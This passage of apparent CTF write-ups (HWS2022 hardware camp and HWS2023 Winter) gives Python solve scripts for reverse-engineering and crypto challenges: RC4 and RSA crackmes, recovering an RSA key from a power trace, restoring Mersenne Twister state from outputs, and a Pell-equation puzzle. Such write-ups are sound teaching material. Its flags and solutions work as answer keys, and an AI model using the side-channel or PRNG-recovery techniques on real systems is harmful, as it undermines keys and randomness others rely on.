cip[0]) + (magic_num ^ cip[2])) ^ (((16 * cip[0]) ^ (cip[2] &gt;&gt; 3))+ ((cip[0] &gt;&gt; 5) ^ (4 * cip[2]))) cip[1]%=(1&lt;&lt;32) cip[0]-= ((magic_num ^ cip[1]) + (v1 ^ cip[7])) ^ (((16 * cip[7]) ^ (cip[1] &gt;&gt; 3)) + ((cip[7] &gt;&gt; 5) ^ (4 * cip[1]))) cip[0]%=(1&lt;&lt;32) magic_num=(magic_num+1640531527)%(1&lt;&lt;32)print(magic_num)flag=b''for i in range(8): flag+=long_to_bytes(cip[i])print(flag) re2拖进IDA中，观察到有TLS回调函数 可以看到回调函数进行了一段动态内存的修改，此处通过动调，可以看到修改后的代码如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869DWORD __stdcall sub_401040(LPVOID lpThreadParameter){ int k; // ebx int v4[65534]; // [esp+Ch] [ebp-50530h] char v5[66816]; // [esp+40004h] [ebp-10538h] BYREF int v6[6]; // [esp+50504h] [ebp-38h] char *v7; // [esp+5051Ch] [ebp-20h] int v8; // [esp+50520h] [ebp-1Ch] int v9; // [esp+50524h] [ebp-18h] int v10; // [esp+50528h] [ebp-14h] int v11; // [esp+5052Ch] [ebp-10h] int i; // [esp+50530h] [ebp-Ch] int v13; // [esp+50534h] [ebp-8h] int j; // [esp+50538h] [ebp-4h] while ( !dword_41B2E4 ) Sleep(0x3E8u); for ( i = 0; i &lt; 112; ++i ) byte_41B30A += *((_BYTE *)&amp;loc_401450 + i); for ( i = 0; byte_41B2EC[i]; ++i ) byte_41B2EC[i] ^= byte_41B30A; v6[0] = 81; v6[1] = 102; v6[2] = 114; v6[3] = 111; v6[4] = 115; v6[5] = 116; for ( j = 0; j &lt; 256; ++j ) *(_DWORD *)&amp;v5[4 * j + 65792] = j; for ( j = 0; j &lt; 256; ++j ) v5[j + 0x10000] = v6[j % 6]; v13 = 0; for ( j = 0; j &lt; 256; ++j ) { v13 = (v5[j + 0x10000] + *(_DWORD *)&amp;v5[4 * j + 65792] + v13) % 256; v10 = *(_DWORD *)&amp;v5[4 * j + 65792]; *(_DWORD *)&amp;v5[4 * j + 65792] = *(_DWORD *)&amp;v5[4 * v13 + 65792]; *(_DWORD *)&amp;v5[4 * v13 + 65792] = v10; } v11 = dword_41B2E8; v9 = 0; v13 = 0; j = 0; while ( v11-- ) { j = (j + 1) % 256; v13 = (*(_DWORD *)&amp;v5[4 * j + 65792] + v13) % 256; v10 = *(_DWORD *)&amp;v5[4 * j + 65792]; *(_DWORD *)&amp;v5[4 * j + 65792] = *(_DWORD *)&amp;v5[4 * v13 + 65792]; *(_DWORD *)&amp;v5[4 * v13 + 65792] = v10; v8 = (*(_DWORD *)&amp;v5[4 * v13 + 65792] + *(_DWORD *)&amp;v5[4 * j + 65792]) % 256; v4[v9++] = *(_DWORD *)&amp;v5[4 * v8 + 65792]; } for ( j = 0; j &lt; dword_41B2E8; ++j ) v5[j] = LOBYTE(v4[j]) ^ byte_41B2EC[j]; v7 = v5; for ( k = 0; k &lt; dword_41B2E8; ++k ) { if ( v7[k] != *(_BYTE *)(k + 4199175) ) { sub_401010(4199237); _loaddll(0); break; } } sub_401010(&quot;right\\n&quot;); sub_40491D(); return 0;} 可以看到这是一段RC4算法，而通过算法生成的密钥流还额外异或了一个值，将输入和密钥流异或后，与内存为0x401307(即4199175)处的密文相比较，调出这段密文，即可解出flag 1234567891011121314151617import rc4cipher =[ 0x7F, 0xB6, 0x88, 0x12, 0xDC, 0xC3, 0xDE, 0xDB, 0x30, 0x24, 0xE3, 0xC1, 0x0F, 0xC9, 0x7F, 0xC2, 0x4D, 0x9C, 0x6B, 0x02, 0x26, 0x20, 0xF1, 0x25, 0xA0, 0xE3, 0xC6, 0xDE]print(len(cipher))key=[81,102,114,111,115,116]a=rc4.decrypt(cipher,key)for i in range(128): t=a for j in range(len(t)): t[j]^=i flag='' for k in t: flag+=chr(k) print(flag) re3拖进jadx 看到有一个trans函数，通过其中的seed将输入转为36进制，还有check函数，引用了.so文件，通过ida打开 定位到check中 可以看到将36进制输入转为相应的十进制后，进行了一段RSA算法，而加密后的结果为 ‘I am sure it is fl4g’ 而n和e在代码中也有给出，通过相应的解密算法并还原为36进制后我们可以得到check函数的输入，再将输入通过trans算法的逆即可解决 12345678910111213141516171819202122232425262728from Crypto.Util.number import long_to_bytes,bytes_to_longimport gmpy2n=0x7019325B70F4A2F26E921102A0206DE415CAEB535CD4EC9D23D6608630DD00A9DB5DB8FAEF4621CCB2E775844C7447A1A843EBAC03ECA6F329FEABCD6560B80AACF7A54A298548827C9D75E1450FCF7E53DAC37C0F7FD25D509C342C23BDA0619504B28EC903C56C87p1=1475203612633975218848450285487339190962027688336790188873776418606441616307026173067p2=1475203612633975218848450285487339190962027688336790188873776418606441616307046219549p3=1475203612633975218848450285487339190962027688336790188873776418606441616307129708089assert n==p1*p2*p3fl4g=b'I am sure it is fl4g'table='0123456789abcdefghijklmnopqrstuvwxyz'e=0x10001phi=(p1-1)*(p2-1)*(p3-1)d=gmpy2.invert(e,phi)mes=pow(bytes_to_long(fl4g),d,n)mes=long_to_bytes(mes)input1=[]for i in mes: input1.append(table[i%36]) input1.append(table[i//36])ii=''for i in input1: ii+=iflag=''for j in range(0,len(ii),2): num=table.index(ii[j])+int(ii[j+1])*36 num=str(num).zfill(3) flag+=numprint(flag) 硬件(Crypto侧信道)-Read&amp;Solve观察波形，推断这是一段RSA加密的功率图 RSA加密时核心在于快速模幂算法，这与加密密钥e的比特位相关，当比特位为1时，加密要额外进行一次模乘运算，因此此时的功率较高，而比特位为0时，则功率较低。因此我们可以根据图中的高低波形来识别出密钥的比特位 编写脚本进行验证，可以发现确实存在满足条件的n 123456789plaintext=0xe2e2cipher=0x12d5key=0b1010110100101100for n in range(plaintext+1,0x13000): if pow(plaintext,key,n)==cipher: print('yes') print(n)print('end')print(hex(key)) random题目中给了两张图片，从made.py文件中可以看到xx.png中的像素值蕴含了flag的信息，只不过通过shuffle打乱分散在各处 关键在于r3数组，我们首先从xx.png的像素值中中提取出原r3数组的信息，然后对made.py进行一下改写，主要是提供一个值为”\\x00\\x01…\\x1c”的FLAG，使得made.py能正常运行，并提取运行过程中的r3‘数组。 由于这两次运行时所用到的随机数种子都相同，在shuffle后得到的r3数组和r3’数组也是大部分都相同，其中不同的只是原来的flag值都被替换为了\\x00~\\x1c。而通过依次比较这两个r3数组内元素的值，提取其中不同的元素并按照\\x00~\\x1c排列，即可得到flag 1234567891011121314151617181920212223242526272829303132333435363738394041from PIL import Imagefrom Crypto.Util.number import long_to_bytes as n2bimport randomrandom.seed(793211)def pbl(bits): num = random.getrandbits(bits) bins = [] while num: bins.append(num &amp; 1) num &gt;&gt;= 1 while len(bins) != bits: bins.append(0) return binscat = Image.open('1.png')xx = Image.open('xx.png')x, y = cat.sizebits = x * yr1=pbl(bits)r2=[]for i in range(28): r2.append(r1[i])r3=[]for i in range(x): for j in range(y): pix_cat=cat.getpixel((i,j)) pix_xx = xx.getpixel((i, j)) r3.append(pix_xx[2]^pix_cat[2])# print(r3)r3_=open('r3.txt','r').read()[1:-1].split(', ')for i in range(len(r3_)): r3_[i]=int(r3_[i])flag=[0]*28for i in range(len(r3)): if r3[i]!=r3_[i]: flag[r3_[i]]=r3[i]flag_=''for i in flag: flag_+=chr(i)print(flag_)","link":"/2022/08/14/HWS2022%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%9C%A8%E7%BA%BF%E5%A4%8F%E4%BB%A4%E8%90%A5/"},{"title":"","text":"HWS2023 Winter Wpby CuratorJin CryptoNumbers Game12345678910111213141516171819202122232425262728293031323334353637383940import hashlibimport randomfrom os import urandomclass Random(object): def __init__(self): self._id = random.getrandbits(128) self._code = random.getrandbits(256) @property def id(self): return hex(self._id)[2:].zfill(32) @property def code(self): return hex(self._code)[2:].zfill(64)random.seed(urandom(32))random_list=[Random() for _ in range(53)]id=[]code=[]for i in range(1, len(random_list)): id.append(random_list[i].id) code.append(random_list[i].code)print(id)print(code)flag=hashlib.md5((random_list[0].id+random_list[0].code).encode()).hexdigest()print('flag{%s}' %flag)'''['d5d97afad7ef619b4badd8d2da10ee24', '67f4660a8335fb9f4152a9fbc44c9c77', '8cd43c85ebe9cc7036a37f47ccd1d1e4', 'ee3e8c62e8b0100027589d6de82677ef', '463bb2f3731ad0e786302bf78da08330', 'e245b1852a3b92734e46eb3421bd76c9', '0b74736786b4ab94651e3b706a548e55', '79cb596b28c2b4e02738f93b5bfbe0d3', '5a9c46837952952045564b5b395acad1', 'd3c2d90a05d1a059fbeba4a05a608798', '4da0306c8ab58097d2fef9114e6fcb6d', '9707fabbd3c96de66917f15998ac9201', '9dd3e46fc930abfb523fe31e8ee8a658', '3716a8fd05f7388e7151d09431e61ee1', '9acf027679a6d7a674a43dee4f5bea35', '78702a2b125a940519337b1bf50aff8a', '262cf3b8c8072a602048a24756c83fcf', '092f8d227ec583c4734a6f449de521a3', '712aa300302b57fed458553426348fce', '834d4a0ea451cc04b469636b18c56435', '754b5284b14402c61e3b1e56cb2d41e9', '51d742ca6a341032afcb5dc645f54bfa', 'c1a33d104f47e33d6932905b483a2018', '3def7c2a14cff6b2864a2100956df07f', '7e3606e4ec1c99fe5a8593ae44f25a70', '404c6139570883dbab8e5a299d7a5017', 'f07597079e1b68ebb4e2d16b83b7b484', '0723daf5c65f8ba6cd6e43fcdf9d18dc', '4c54db12829f165837384b66978e8438', 'cd056e64e1f31461cab2e66ece9d3278', '2f6ae16fab122cbce240e32464a1ab57', 'f86e0e9ee23498340f62d8617f6f5218', 'af4ebe2535885c783c89f8d8c4815076', 'c8eae5b5c7aca2c5fdb4f284e2cf65c5', 'bec0d8ecabedd9811a8ecb6052b21d8c', '731bd3421b6517aa101357fe1c49caf3', '344f4a26cdaf1a782d9b32208e1a3e92', '892b1741d304878461dd0774a335ea3d', '56e2a484ca40f43e059bf5f0bd822bdc', 'd7c0762df71b31c14654147fb9a0595c', '57016a179ba5509f6b04a161ac628b34', 'e49a2d573522c1ee3e8348ceca0295a4', '4b0f49c7e6469e82832e9cc90b9e17c0', 'eadc9d0c8b75127fe0a7f71881de1ea7', 'db9fe5537768207bd8cdf770bcd42dfa', 'ba2f57578752628d1ecac419b3a8bc36', '3752e70b5d2b578a8d412d84aab43705', '54e97795df8781c776cbb1ce4f5f31fc', '32794880abc9f68102c24e92ad9c7cd5', 'b5eb7e651ca298f6873694c47d1cd3da', 'a188934777d2c67e3d59692135005497', '34c308fa1644b387169ea88c1b575490']['2eebed894580fb900c3615d4866150e68322ff4d48e7509f85ff4543969b0cf6', '017aefd63b4ce14eb376161902d92894a15f680e7b055ce25c3b02c6b49db0a6', 'e12d945904032887c967ae03a48c8b096abc79dc64134d872693599d4f6c91cc', '0f8957f365f53a7209baa852905c5da5dba54ddb403ab17a4c9b3a051540d49c', '091e3e41815cd32f482f2cf54ac3338fc918c2a657896af1aa1b23ea528664f4', '5916cd18e8c48c545232112f2179aa7a722350a8a0ced4f1363cc61bc9d83630', '37702710d47a1c17278743253123f6eac85b16d9393432ec65100143bc8657e8', 'c3a7006293c48957cba5c010f945483cfdc47650a79d0e8a8a9a52c174244a10', 'e1a90a475dd21da64d64ea1dd50a82a622061d08e9d4b3016982c4a0b42f1251', '2f40ff85024765e58ed175927c53e0a279cda96ce755b602f89bfc171108ba3d', 'f4f8337dd7267d02638a9cc531c8a02fe0316dd5ff6f8c8aec898c060c6fb217', '0df2f3fe1eb976944a2de5729fca4a12b83c8329b4f514869856ebb94b7d7bf9', 'abb2f1277b1cb5ad07254b7f7ed346bcdb73282b306123ce0b5befe42a9e796d', '6ef31ed6a2a465bcd146c2438bf391bfd9f3187cf54afae512220a7a94714bf3', '6981f99ba288923a5cd68908ecc8795bf301f1e7d081ac6580a63902fd52da01', 'b6b07975697de1c0342e3711b59165b849125794ef2541c6c60dcf40e689df7b', '20e3af3a2bcedfd15199975cc9edcde14cb13fdff3ea0607a4747601e500aede', '606aa1daf188b9dd5fd6141312f1828846f92baa519e70e5c6923a352421fe2f', '1dc6a60112e99c5b884c0bb5430a7a54eba8aef34fada9cb96bce79a22456cf2', 'fd81e36f576119a19185cd12e87544b42f9fcc3dcb5e7ba282b1a128d73d63c5', '7a01e947ca012a5c9a8dd20e693a7788cd6157a5c3fce5fa7c7e09014ea3266e', 'ccd162b182c773062514ffc3551ed47f32293700083782d902efc55b1e9795c6', 'dbb6115aefd2638eebf44d3be6e9525e09ff036269d954469a0f925b496327a7', 'ac08696fe64bb5e58cd3e558463213ca08ab7805e33f45459ae14b35fc5858c6', '6e1594596ad1c656635af29d14b22a5ed10e545442eea5f4e056e20d11aa33b3', '4afd17e64562603c66ce0ca42d544ca48511c3d560f9180c231a9ccb28a0e55e', '06b2d2b24ca626e18fdcb3196e989e3b05150500815511f48200ddea9aacda48', '947a11e8258fd161d02b0eb1b2e8fcd9ff1684a7c75f7c506ddee91f08316f56', 'a0e58b15736cab055be1d03860dedb6b8136f6739308c2e0ef6a7490c6b4a1f1', '31476f64f96d72a398e7eb789068b8cfd61ed9cac95d76824a2bbf5b682ea72d', '974259198846a4849d318afd325d860a6e40dfd39e1ed8c7b6d87c990e35efcf', 'e93d02ba7079c488c30e377794b4fcc62eeafb6c3f02197f1ebc059e3e5f7f07', 'ded96eec0d25c05a54671a001bcd99f5c6d3991d2fdf80afb8f0861a44f3fd64', '86f34c1da65f07634de7c302a6df306dd545806022411a318900bd33b0aff9bd', '59baf4cf3d3b85fcdefd1a9b60c3d78926ff73650ac375c616b30fe9063b377d', '02f2ee251ecc19fa52dd42c0e0b609bc2e7a8ae11ce6ca35396a4bc74d12ac63', '597d09b4c43012b1b4b040d8c62d5fb02d1c4249de4eea06e1447000ba53f50c', 'bb87bd8e1903db2df41c349914e9f3591bb032400be6e86ed10e7d292243a374', 'cec38960069fdc8090cfbdd166e15ec8a77ce5b4d6b350805a63d2b54cbf0187', '1439d35a9c0caa9cacabe8e6179a02d51ebb9fb51125d5eeaba47ff6b8abcc97', '820d72d49e0fd86ef47b022a3091b326be8b0d2a42f87cbc918737b9972ea62f', 'e625e82100031fa4a4410700034859cd4b35c086f5ac2870c6909c16a6831bfc', 'f0e22f5167d29331351e1718c17b5420f6a29d84357273e1bfb24c2ff34fa675', 'a5a7991f0c5c6a44f68c5c18661611057dbabeff7847623315ce784095645f75', '07cd3f5c5c690214af5feda27b3aec257543a8f96bc509805028a0e95c5d98c6', '6e5dd4405c1b446b9530e4d9356c05b71d1bfcf8a79778588143c3b6fec3fded', 'a33f821d277e6f73c09a5ecd14cef80bac29ffe2b917225c27725d2447ac0489', 'c18a4a02dd1f7ee65bf5596c53549c286a754afb0e3b90b2369cdd1e43c0b986', '6b8df66aa27b40ca275bc133958b5d543167edf919e7e623a496c9afbf7594d6', 'c48124eeef995c7bb705bd240a26dbf6bdbe42ba29addf7ac78fa28dbed3debe', '040eef11dc6e0f3bb3e58e12d2a57ee274071a9c6224f27db70e19a8aa7d4df2', '4ecd0a955e52657fab8dfdac2df4d805f1d08b031df8bce22ac01fe20ca72c5b']''' 考察梅森旋转算法，可以参考这篇文章 浅析MT19937伪随机数生成算法-安全客 - 安全资讯平台 (anquanke.com) 梅森素数算法每次可以生成32bit的随机数，getrandbits(128)可以看作一次性生成4个32bit的随机数，getrandbits(256)也类似 题中给出了第一轮随机数的第13~624个随机数和第二轮随机数的第1~12随机数，要求还原第一轮随机数的第1~12个随机数 通过逆向extract_number可以还原state，而前12个随机数与397后12个state有关，由此可以还原成功 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104from random import Randomimport hashlib# right shift inversedef inverse_right(res,shift,bits=32): tmp = res for i in range(bits//shift): tmp = res ^ tmp &gt;&gt; shift return tmp# right shift with mask inversedef inverse_right_values(res,shift,mask,bits=32): tmp = res for i in range(bits//shift): tmp = res ^ tmp&gt;&gt;shift &amp; mask return tmp# left shift inversedef inverse_left(res,shift,bits=32): tmp = res for i in range(bits//shift): tmp = res ^ tmp &lt;&lt; shift return tmp# left shift with mask inversedef inverse_left_values(res,shift,mask,bits=32): tmp = res for i in range(bits//shift): tmp = res ^ tmp &lt;&lt; shift &amp; mask return tmpdef backtrace(cur): high = 0x80000000 low = 0x7fffffff mask = 0x9908b0df state = cur for i in range(11,-1,-1): tmp = state[i+624]^state[i+397] # recover Y,tmp = Y if tmp &amp; high == high: tmp ^= mask tmp &lt;&lt;= 1 tmp |= 1 else: tmp &lt;&lt;=1 # recover highest bit res = tmp&amp;high # recover other 31 bits,when i =0,it just use the method again it so beautiful!!!! tmp = state[i-1+624]^state[i+396] # recover Y,tmp = Y if tmp &amp; high == high: tmp ^= mask tmp &lt;&lt;= 1 tmp |= 1 else: tmp &lt;&lt;=1 res |= (tmp)&amp;low state[i] = res return statedef recover_state(out): state = [] for i in out: i = inverse_right(i,18) i = inverse_left_values(i,15,0xefc60000) i = inverse_left_values(i,7,0x9d2c5680) i = inverse_right(i,11) state.append(i) return stateid=['d5d97afad7ef619b4badd8d2da10ee24', '67f4660a8335fb9f4152a9fbc44c9c77', '8cd43c85ebe9cc7036a37f47ccd1d1e4', 'ee3e8c62e8b0100027589d6de82677ef', '463bb2f3731ad0e786302bf78da08330', 'e245b1852a3b92734e46eb3421bd76c9', '0b74736786b4ab94651e3b706a548e55', '79cb596b28c2b4e02738f93b5bfbe0d3', '5a9c46837952952045564b5b395acad1', 'd3c2d90a05d1a059fbeba4a05a608798', '4da0306c8ab58097d2fef9114e6fcb6d', '9707fabbd3c96de66917f15998ac9201', '9dd3e46fc930abfb523fe31e8ee8a658', '3716a8fd05f7388e7151d09431e61ee1', '9acf027679a6d7a674a43dee4f5bea35', '78702a2b125a940519337b1bf50aff8a', '262cf3b8c8072a602048a24756c83fcf', '092f8d227ec583c4734a6f449de521a3', '712aa300302b57fed458553426348fce', '834d4a0ea451cc04b469636b18c56435', '754b5284b14402c61e3b1e56cb2d41e9', '51d742ca6a341032afcb5dc645f54bfa', 'c1a33d104f47e33d6932905b483a2018', '3def7c2a14cff6b2864a2100956df07f', '7e3606e4ec1c99fe5a8593ae44f25a70', '404c6139570883dbab8e5a299d7a5017', 'f07597079e1b68ebb4e2d16b83b7b484', '0723daf5c65f8ba6cd6e43fcdf9d18dc', '4c54db12829f165837384b66978e8438', 'cd056e64e1f31461cab2e66ece9d3278', '2f6ae16fab122cbce240e32464a1ab57', 'f86e0e9ee23498340f62d8617f6f5218', 'af4ebe2535885c783c89f8d8c4815076', 'c8eae5b5c7aca2c5fdb4f284e2cf65c5', 'bec0d8ecabedd9811a8ecb6052b21d8c', '731bd3421b6517aa101357fe1c49caf3', '344f4a26cdaf1a782d9b32208e1a3e92', '892b1741d304878461dd0774a335ea3d', '56e2a484ca40f43e059bf5f0bd822bdc', 'd7c0762df71b31c14654147fb9a0595c', '57016a179ba5509f6b04a161ac628b34', 'e49a2d573522c1ee3e8348ceca0295a4', '4b0f49c7e6469e82832e9cc90b9e17c0', 'eadc9d0c8b75127fe0a7f71881de1ea7', 'db9fe5537768207bd8cdf770bcd42dfa', 'ba2f57578752628d1ecac419b3a8bc36', '3752e70b5d2b578a8d412d84aab43705', '54e97795df8781c776cbb1ce4f5f31fc', '32794880abc9f68102c24e92ad9c7cd5', 'b5eb7e651ca298f6873694c47d1cd3da', 'a188934777d2c67e3d59692135005497', '34c308fa1644b387169ea88c1b575490']code=['2eebed894580fb900c3615d4866150e68322ff4d48e7509f85ff4543969b0cf6', '017aefd63b4ce14eb376161902d92894a15f680e7b055ce25c3b02c6b49db0a6', 'e12d945904032887c967ae03a48c8b096abc79dc64134d872693599d4f6c91cc', '0f8957f365f53a7209baa852905c5da5dba54ddb403ab17a4c9b3a051540d49c', '091e3e41815cd32f482f2cf54ac3338fc918c2a657896af1aa1b23ea528664f4', '5916cd18e8c48c545232112f2179aa7a722350a8a0ced4f1363cc61bc9d83630', '37702710d47a1c17278743253123f6eac85b16d9393432ec65100143bc8657e8', 'c3a7006293c48957cba5c010f945483cfdc47650a79d0e8a8a9a52c174244a10', 'e1a90a475dd21da64d64ea1dd50a82a622061d08e9d4b3016982c4a0b42f1251', '2f40ff85024765e58ed175927c53e0a279cda96ce755b602f89bfc171108ba3d', 'f4f8337dd7267d02638a9cc531c8a02fe0316dd5ff6f8c8aec898c060c6fb217', '0df2f3fe1eb976944a2de5729fca4a12b83c8329b4f514869856ebb94b7d7bf9', 'abb2f1277b1cb5ad07254b7f7ed346bcdb73282b306123ce0b5befe42a9e796d', '6ef31ed6a2a465bcd146c2438bf391bfd9f3187cf54afae512220a7a94714bf3', '6981f99ba288923a5cd68908ecc8795bf301f1e7d081ac6580a63902fd52da01', 'b6b07975697de1c0342e3711b59165b849125794ef2541c6c60dcf40e689df7b', '20e3af3a2bcedfd15199975cc9edcde14cb13fdff3ea0607a4747601e500aede', '606aa1daf188b9dd5fd6141312f1828846f92baa519e70e5c6923a352421fe2f', '1dc6a60112e99c5b884c0bb5430a7a54eba8aef34fada9cb96bce79a22456cf2', 'fd81e36f576119a19185cd12e87544b42f9fcc3dcb5e7ba282b1a128d73d63c5', '7a01e947ca012a5c9a8dd20e693a7788cd6157a5c3fce5fa7c7e09014ea3266e', 'ccd162b182c773062514ffc3551ed47f32293700083782d902efc55b1e9795c6', 'dbb6115aefd2638eebf44d3be6e9525e09ff036269d954469a0f925b496327a7', 'ac08696fe64bb5e58cd3e558463213ca08ab7805e33f45459ae14b35fc5858c6', '6e1594596ad1c656635af29d14b22a5ed10e545442eea5f4e056e20d11aa33b3', '4afd17e64562603c66ce0ca42d544ca48511c3d560f9180c231a9ccb28a0e55e', '06b2d2b24ca626e18fdcb3196e989e3b05150500815511f48200ddea9aacda48', '947a11e8258fd161d02b0eb1b2e8fcd9ff1684a7c75f7c506ddee91f08316f56', 'a0e58b15736cab055be1d03860dedb6b8136f6739308c2e0ef6a7490c6b4a1f1', '31476f64f96d72a398e7eb789068b8cfd61ed9cac95d76824a2bbf5b682ea72d', '974259198846a4849d318afd325d860a6e40dfd39e1ed8c7b6d87c990e35efcf', 'e93d02ba7079c488c30e377794b4fcc62eeafb6c3f02197f1ebc059e3e5f7f07', 'ded96eec0d25c05a54671a001bcd99f5c6d3991d2fdf80afb8f0861a44f3fd64', '86f34c1da65f07634de7c302a6df306dd545806022411a318900bd33b0aff9bd', '59baf4cf3d3b85fcdefd1a9b60c3d78926ff73650ac375c616b30fe9063b377d', '02f2ee251ecc19fa52dd42c0e0b609bc2e7a8ae11ce6ca35396a4bc74d12ac63', '597d09b4c43012b1b4b040d8c62d5fb02d1c4249de4eea06e1447000ba53f50c', 'bb87bd8e1903db2df41c349914e9f3591bb032400be6e86ed10e7d292243a374', 'cec38960069fdc8090cfbdd166e15ec8a77ce5b4d6b350805a63d2b54cbf0187', '1439d35a9c0caa9cacabe8e6179a02d51ebb9fb51125d5eeaba47ff6b8abcc97', '820d72d49e0fd86ef47b022a3091b326be8b0d2a42f87cbc918737b9972ea62f', 'e625e82100031fa4a4410700034859cd4b35c086f5ac2870c6909c16a6831bfc', 'f0e22f5167d29331351e1718c17b5420f6a29d84357273e1bfb24c2ff34fa675', 'a5a7991f0c5c6a44f68c5c18661611057dbabeff7847623315ce784095645f75', '07cd3f5c5c690214af5feda27b3aec257543a8f96bc509805028a0e95c5d98c6', '6e5dd4405c1b446b9530e4d9356c05b71d1bfcf8a79778588143c3b6fec3fded', 'a33f821d277e6f73c09a5ecd14cef80bac29ffe2b917225c27725d2447ac0489', 'c18a4a02dd1f7ee65bf5596c53549c286a754afb0e3b90b2369cdd1e43c0b986', '6b8df66aa27b40ca275bc133958b5d543167edf919e7e623a496c9afbf7594d6', 'c48124eeef995c7bb705bd240a26dbf6bdbe42ba29addf7ac78fa28dbed3debe', '040eef11dc6e0f3bb3e58e12d2a57ee274071a9c6224f27db70e19a8aa7d4df2', '4ecd0a955e52657fab8dfdac2df4d805f1d08b031df8bce22ac01fe20ca72c5b']c=[]for i in range(len(id)): tmp=int(id[i],16) c.append(tmp&amp;0xffffffff) c.append((tmp&gt;&gt;32)&amp;0xffffffff) c.append((tmp&gt;&gt;64)&amp;0xffffffff) c.append(tmp&gt;&gt;96) tmp=int(code[i],16) c.append(tmp&amp;0xffffffff) c.append((tmp&gt;&gt;32)&amp;0xffffffff) c.append((tmp&gt;&gt;64)&amp;0xffffffff) c.append((tmp&gt;&gt;96)&amp;0xffffffff) c.append((tmp&gt;&gt;128)&amp;0xffffffff) c.append((tmp&gt;&gt;160)&amp;0xffffffff) c.append((tmp&gt;&gt;192)&amp;0xffffffff) c.append(tmp&gt;&gt;224) partS = recover_state(c)state = backtrace([0]*12+partS)[:624]# print(state)prng = Random()prng.setstate((3,tuple(state+[0]),None))# for i in range(14): # verify# print(hex(prng.getrandbits(128)))# print(hex(prng.getrandbits(256))) id=prng.getrandbits(128)code=prng.getrandbits(256)flag=hashlib.md5((hex(id)[2:].zfill(32)+hex(code)[2:].zfill(32)).encode()).hexdigest()print('flag{%s}' %flag) math1234567891011121314151617from Crypto.Util.number import *from secret import flag,a,bfrom random import shuffleD = 0x1337assert a**2 - D*b**2 == 1m = bytes_to_long(flag)p = getPrime(512)x = (a * m + b) % py=bin(x)[2:]c=[y[i:i+85] for i in range(0,len(y),85)]shuffle(c)print(p)print(c)# p=11199186558148426014734492874345932099384932524559726349180064588241518696390926354448476750322781683505497782040786332571272422812867731614415519029276349# c=['0010101111100011101101011111111001011000100110001001000000010001111011110101110011111', '0011010010010010110010011011001100110001100010101110001010001101110001100000111011010', '0110101101011101110000100001000000010001110110001010000000010110010101100100101110000', '0100111001011010000101100111100110101100011100100111011000110001111101000110110101101', '1100100110011101010011011111000101011011010000101100011001110100101000101101111110100', '1110111110001110000101100000000100111010110000001111010001101001100001010110101010001'] 佩尔方程形如以下的方程 x^2-Dy^2=1平凡情形： $D\\leq0$时 $D&gt;0$且$D$为一个平方数： x^2-Dy^2=(x+\\sqrt{D}y)(x-\\sqrt{D}y)=1\\rarr x=1,y=0(x,y\\geq0) 非平凡情形：$D&gt;0$且$D$不是一个平方数 通过连分数理论求解： 一个直观的视角： D=\\frac{x^2 -1}{y^2}即 \\sqrt D\\approx \\frac xy由此可以发现方程的解可以通过遍历$\\sqrt D$的连分数形式求得 而佩尔方程的解满足以下递推式 x_n=x_{n-1}x_1+Dy_{n-1}y_1\\\\ y_n=x_{n-1}y_1+y_{n-1}x_1证明如下：若$(x_1,y_1), (x_2,y_2)$是PELL方程的解，有 x_1^2-Dy_1^2=1\\\\ x_2^2-Dy_2^2=1两式相乘得$(x_1^2-dy_1^2)(x_2^2-Dy_2^2)=1$，展开配方得 (x_1x_2+Dy_1y_2)^2-D(x_1y_2+y_1x_2)^2=1这说明$(x_1x_2+Dy_1y_2,x_1y_2+y_1x_2)$也是方程的一个解 由此可以得到一个迭代的递推式： x_n=x_{n-1}x_1+Dy_{n-1}y_1\\\\ y_n=x_{n-1}y_1+y_{n-1}x_1写为矩阵幂形式： \\begin{pmatrix} x_n\\\\ y_n \\end{pmatrix}= \\begin{pmatrix} x_0 & Dy_0\\\\ y_0 & x_0 \\end{pmatrix}^n \\begin{pmatrix} x_0\\\\ y_0 \\end{pmatrix}参考：佩尔（Pell）方程 - 知乎 (zhihu.com) 1234567891011121314151617181920212223242526272829def solve_pell(N, numTry = 100): cf = continued_fraction(sqrt(N)) for i in range(numTry): denom = cf.denominator(i) numer = cf.numerator(i) if numer^2 - N * denom^2 == 1: return numer, denom return None, Nonedef gen_pell(D): x, y = solve_pell(D) xs = [x] ys = [y] while True: yield xs[-1], ys[-1] x_i = xs[0] * xs[-1] + D * ys[0] * ys[-1] y_i = xs[0] * ys[-1] + ys[0] * xs[-1] xs.append(x_i) ys.append(y_i)D=0X1337i=0for (a, b) in gen_pell(0x1337): if a**2 - D*b**2 == 1: i+=1 print(a,b) if i==10: break print('end') 由于a,b有多个选择，而题目中未给出具体信息，一个一个试之后既可以得到flag 123456789101112131415161718import gmpy2import randomfrom Crypto.Util.number import long_to_bytesD=0x1337a=53200721345440680434479800082574205732691739667711830725264009401557181822242813699602474373605375092592112977989801955125150522790094094583800537374464826637921833880 b=758541086916055015014320737616136271144926641907497953577758460111889124029082440591769040740929916115962475828295767098936363707802967978097736501782680941253925589print(a.bit_length())assert a**2 - D*b**2 == 1p=11199186558148426014734492874345932099384932524559726349180064588241518696390926354448476750322781683505497782040786332571272422812867731614415519029276349c=['0010101111100011101101011111111001011000100110001001000000010001111011110101110011111', '0011010010010010110010011011001100110001100010101110001010001101110001100000111011010', '0110101101011101110000100001000000010001110110001010000000010110010101100100101110000', '0100111001011010000101100111100110101100011100100111011000110001111101000110110101101', '1100100110011101010011011111000101011011010000101100011001110100101000101101111110100', '1110111110001110000101100000000100111010110000001111010001101001100001010110101010001']flag=b''while b'flag' not in flag: random.shuffle(c) str=c[0]+c[1]+c[2]+c[3]+c[4]+c[5] m=int(str,2) m=(m-b)*gmpy2.invert(a,p)%p flag=long_to_bytes(m)print(flag) Reversebabyre用jd-gui打开，定位到mainActivity，再找到flag验证的check函数 逻辑很简单，但逆操作回去之后发现得不到flag，继续查找，发现其他函数实现了一个dex文件的插入 于是将apk解压，找到enc文件并解密，将解密后结果拖入jadx中，发现了真正的加密逻辑 逆向回去即可得到flag 1234567891011121314from Crypto.Util.number import long_to_bytesfrom Crypto.Cipher import AESimport 